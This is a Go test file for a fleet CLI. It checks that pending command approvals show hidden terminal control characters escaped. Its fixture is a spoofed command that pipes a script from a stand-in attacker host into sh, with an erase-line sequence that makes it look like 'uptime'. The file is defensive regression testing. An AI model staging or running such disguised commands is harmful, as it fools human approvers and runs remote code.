// SPDX-License-Identifier: AGPL-3.0-or-later
// Copyright (C) 2026 Cenvero / Shubhdeep Singh

package cli

import (
	"bytes"
	"strings"
	"testing"
	"time"

	"github.com/cenvero/fleet/internal/core"
	"github.com/spf13/cobra"
)

// spoofedCommand is what a scoped token could stage: on a terminal the
// carriage return and "erase line" sequence hide everything before "uptime",
// so an approver reviewing it would see a harmless command.
const spoofedCommand = "curl -s https://evil.example/x | sh #\r\x1b[2Kuptime"

func hasTerminalControl(s string) bool {
	for _, r := range s {
		if (r < 0x20 && r != '\n') || r == 0x7f || (r >= 0x80 && r < 0xa0) || r == 0x202e || r == 0x200b {
			return true
		}
	}
	return false
}

// TestDescribeApprovalShowsHiddenCharacters: the approval review must show
// exactly what will run. Control and invisible characters in a staged command
// or option are rendered escaped, never passed through to the terminal.
func TestDescribeApprovalShowsHiddenCharacters(t *testing.T) {
	a := core.Approval{
		ID: "a1", Server: "web-01", Command: spoofedCommand, RequestedBy: "token:agent",
		Requested: time.Now(),
		Exec:      &core.ApprovalExec{OnFail: "true\r\x1b[2K# nothing", Secrets: []string{"K=@k\u202e"}},
	}
	var out bytes.Buffer
	describeApproval(&out, a)
	got := out.String()
	if hasTerminalControl(got) {
		t.Fatalf("approval review passes terminal control characters through: %q", got)
	}
	if !strings.Contains(got, `curl -s https://evil.example/x | sh #\r\x1b[2Kuptime`) {
		t.Fatalf("approval review does not show the real command escaped: %q", got)
	}
	if !strings.Contains(got, "invisible") {
		t.Fatalf("approval review does not warn about hidden characters: %q", got)
	}

	// An ordinary command is shown exactly as before.
	out.Reset()
	describeApproval(&out, core.Approval{ID: "a2", Server: "web-01", Command: "./deploy.sh --fast 'a b'", Requested: time.Now()})
	if !strings.Contains(out.String(), "  command: ./deploy.sh --fast 'a b'\n") || strings.Contains(out.String(), "invisible") {
		t.Fatalf("plain command rendering changed: %q", out.String())
	}
}

// TestApprovalTableShowsHiddenCharacters: `fleet approvals list` and
// `fleet approvals reject` must not replay a staged command's control
// characters either.
func TestApprovalTableShowsHiddenCharacters(t *testing.T) {
	var out bytes.Buffer
	cmd := &cobra.Command{}
	cmd.SetOut(&out)
	if err := writeApprovalTable(cmd, []core.Approval{{ID: "a1", Server: "web-01", Status: core.ApprovalPending, Command: spoofedCommand}}); err != nil {
		t.Fatal(err)
	}
	if hasTerminalControl(out.String()) {
		t.Fatalf("approvals list passes terminal control characters through: %q", out.String())
	}

	dir := newServerCommandTestConfig(t)
	id, err := core.NewApprovalStore(dir).StageExec("web-01", spoofedCommand, time.Hour, nil, "token:agent")
	if err != nil {
		t.Fatal(err)
	}
	root := NewRootCommand()
	var stdout, stderr bytes.Buffer
	root.SetOut(&stdout)
	root.SetErr(&stderr)
	root.SetArgs([]string{"--config-dir", dir, "approvals", "reject", id})
	t.Setenv("FLEET_TOKEN", "")
	if err := root.Execute(); err != nil {
		t.Fatalf("reject: %v (stderr=%q)", err, stderr.String())
	}
	if hasTerminalControl(stdout.String()) {
		t.Fatalf("approvals reject passes terminal control characters through: %q", stdout.String())
	}
}
